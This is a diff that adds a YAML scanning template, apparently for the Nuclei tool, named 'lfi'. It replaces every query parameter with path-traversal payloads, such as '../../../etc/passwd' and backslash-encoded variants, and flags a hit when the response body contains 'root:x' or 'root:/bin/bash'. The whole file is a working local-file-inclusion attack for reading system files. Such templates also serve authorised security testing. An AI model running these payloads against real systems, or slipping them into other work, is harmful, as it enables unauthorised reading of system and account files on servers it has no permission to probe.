@@ -1,0 +1,34 @@
+id: lfi
+
+info:
+  name: lfi
+  author: amahrou1
+  severity: high
+  tags: LFI
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      injection:
+        - ../../../../../../../etc/passwd
+        - ///////../../../etc/passwd
+        - /etc/passwd
+        - //..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd
+    fuzzing:
+      - part: query
+        type: replace # replaces existing parameter value with fuzz payload
+        mode: multiple # replaces all parameters value with fuzz payload
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:x"
+          - "bin:x"
+          - "root:/bin/bash"
+        part: body
